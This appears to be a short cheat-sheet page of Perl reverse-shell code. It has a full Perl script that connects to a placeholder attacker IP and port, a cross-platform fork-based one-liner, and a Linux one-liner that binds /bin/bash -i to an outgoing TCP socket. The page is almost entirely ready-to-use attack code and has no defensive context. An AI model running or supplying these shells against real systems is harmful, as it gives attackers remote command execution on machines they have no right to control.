# Reverse Shell

## Cross Platform

```perl
use strict;
use warnings;

use Socket;

sub reverse_shell {
    my ($ip, $port) = @_;

    my $proto = getprotobyname('tcp');
    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
    my $iaddr = inet_aton($ip) or die "inet_aton: $!";
    my $paddr = sockaddr_in($port, $iaddr);

    connect(SOCKET, $paddr) or die "connect: $!";
    print SOCKET "Connected to the reverse shell...\n";

    while (1) {
        print '$ ';
        my $command = <STDIN>;
        chomp($command);
        last if $command eq 'exit';

        print SOCKET qx($command 2>&1);
    }

    print SOCKET "Closing reverse shell...\n";
    close SOCKET;
}

my $ip = '<attacker_IP>';
my $port = <attacker_PORT>;
reverse_shell($ip, $port);
```

One-liner.

```
> perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Linux

```
$ perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```